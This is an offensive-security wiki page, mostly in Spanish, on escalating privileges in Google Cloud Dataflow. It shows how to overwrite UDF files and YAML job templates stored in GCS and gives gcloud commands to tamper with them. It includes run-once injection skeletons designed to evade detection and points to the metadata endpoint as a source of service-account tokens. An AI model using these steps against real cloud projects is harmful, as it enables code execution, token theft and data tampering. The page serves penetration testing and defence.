# GCP - Dataflow Escalada de privilegios

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### `storage.objects.create`, `storage.objects.get`, `storage.objects.update`

Dataflow no valida la integridad de los UDFs ni de los YAMLs de plantillas de job almacenados en GCS.
Con acceso de escritura al bucket, puedes sobrescribir estos archivos para inyectar código, ejecutar código en los workers, robar tokens de cuentas de servicio o alterar el procesamiento de datos.
Tanto los jobs de batch como los de streaming en pipelines son objetivos viables para este ataque. Para ejecutarlo en una pipeline hay que reemplazar los UDFs/plantillas antes de que el job se ejecute: durante los primeros minutos (antes de que se creen los workers) o durante la ejecución del job, antes de que se creen nuevos workers (por autoscaling).

**Attack vectors:**
- **UDF hijacking:** Python (`.py`) y JS (`.js`) UDFs referenciados por pipelines y almacenados en buckets gestionados por el cliente
- **Job template hijacking:** Definiciones de pipeline en YAML personalizadas almacenadas en buckets gestionados por el cliente


> [!WARNING]
> **Run-once-per-worker trick:** Los UDFs de Dataflow y los callables de plantillas se invocan **por fila/línea**. Sin coordinación, la exfiltración o el robo de tokens se ejecutaría miles de veces, provocando ruido, limitación por tasa y detección. Usa un patrón de **coordinación basado en archivos**: comprueba si existe un archivo marcador (p.ej. `/tmp/pwnd.txt`) al inicio; si existe, omite el código malicioso; si no, ejecuta el payload y crea el archivo. Esto asegura que el payload se ejecute **una sola vez por worker**, no por línea.


#### Direct exploitation via gcloud CLI

1. Enumerate Dataflow jobs and locate the template/UDF GCS paths:

<details>

<summary>List jobs and describe to get template path, staging location, and UDF references</summary>
```bash
# List jobs (optionally filter by region)
gcloud dataflow jobs list --region=<region>
gcloud dataflow jobs list --project=<PROJECT_ID>

# Describe a job to get template GCS path, staging location, and any UDF/template references
gcloud dataflow jobs describe <JOB_ID> --region=<region> --full --format="yaml"
# Look for: currentState, createTime, jobMetadata, type (JOB_TYPE_STREAMING or JOB_TYPE_BATCH)
# Pipeline options often include: tempLocation, stagingLocation, templateLocation, or flexTemplateGcsPath
```
</details>

2. Descargar el UDF original o la plantilla de job desde GCS:

<details>

<summary>Descargar archivo UDF o plantilla YAML desde el bucket</summary>
```bash
# If job references a UDF at gs://bucket/path/to/udf.py
gcloud storage cp gs://<BUCKET>/<PATH>/<udf_file>.py ./udf_original.py

# Or for a YAML job template
gcloud storage cp gs://<BUCKET>/<PATH>/<template>.yaml ./template_original.yaml
```
</details>

3. Edita el archivo localmente: inyecta la carga maliciosa (ver los fragmentos Python UDF o YAML a continuación) y asegúrate de usar el patrón de coordinación run-once.

4. Vuelve a subir para sobrescribir el archivo original:

<details>

<summary>Sobrescribir UDF o plantilla en bucket</summary>
```bash
gcloud storage cp ./udf_injected.py gs://<BUCKET>/<PATH>/<udf_file>.py

# Or for YAML
gcloud storage cp ./template_injected.yaml gs://<BUCKET>/<PATH>/<template>.yaml
```
</details>

5. Espera a la siguiente ejecución del job, o (para streaming) provoca el autoscaling (p. ej. saturando la entrada del pipeline) para que nuevos workers se inicien y obtengan el archivo modificado.

#### Python UDF injection

Si quieres que el worker exfiltre datos a tu servidor C2 usa `urllib.request` y no `requests`.
`requests` no está preinstalado en los workers clásicos de Dataflow.

<details>

<summary>Malicious UDF with run-once coordination and metadata extraction</summary>
```python
import os
import json
import urllib.request
from datetime import datetime

def _malicious_func():
# File-based coordination: run once per worker.
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return

# malicous code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")

def transform(line):
# Malicous code entry point - runs per line but coordination ensures once per worker
try:
_malicious_func()
except Exception:
pass
# ... original UDF logic follows ...
```
</details>


#### Inyección YAML en plantillas de Job

Inyecta un paso `MapToFields` con un callable que use un archivo de coordinación. Para pipelines basados en YAML que soporten `requests`, úsalo si la plantilla declara `dependencies: [requests]`; de lo contrario, prefiere `urllib.request`.

Añade el paso de limpieza (`drop: [malicious_step]`) para que el pipeline siga escribiendo datos válidos en el destino.

<details>

<summary>Paso MapToFields malicioso y limpieza en el pipeline YAML</summary>
```yaml
- name: MaliciousTransform
type: MapToFields
input: Transform
config:
language: python
fields:
malicious_step:
callable: |
def extract_and_return(row):
import os
import json
from datetime import datetime
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return True
try:
import urllib.request
# malicious code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")
except Exception:
pass
return True
append: true
- name: CleanupTransform
type: MapToFields
input: MaliciousTransform
config:
fields: {}
append: true
drop:
- malicious_step
```
</details>

### Compute Engine access to Dataflow Workers

**Permisos:** `compute.instances.osLogin` or `compute.instances.osAdminLogin` (with `iam.serviceAccounts.actAs` over the worker SA), or `compute.instances.setMetadata` / `compute.projects.setCommonInstanceMetadata` (with `iam.serviceAccounts.actAs`) para la inyección heredada de claves SSH

Los Dataflow workers se ejecutan como VMs de Compute Engine. El acceso a los workers mediante OS Login o SSH permite leer tokens de SA desde el endpoint de metadata (`http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`), manipular datos o ejecutar código arbitrario.

Para detalles de explotación, ver:
- [GCP - Compute Privesc](gcp-compute-privesc/README.md) — `compute.instances.osLogin`, `compute.instances.osAdminLogin`, `compute.instances.setMetadata`

## Referencias

- [Dataflow Rider: How Attackers can Abuse Shadow Resources in Google Cloud Dataflow](https://www.varonis.com/blog/dataflow-rider)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [gcloud dataflow jobs describe](https://cloud.google.com/sdk/gcloud/reference/dataflow/jobs/describe)
- [Apache Beam YAML: User-defined functions](https://beam.apache.org/documentation/sdks/yaml-udf/)
- [Apache Beam YAML Transform Reference](https://beam.apache.org/releases/yamldoc/current/)

{{#include ../../../banners/hacktricks-training.md}}
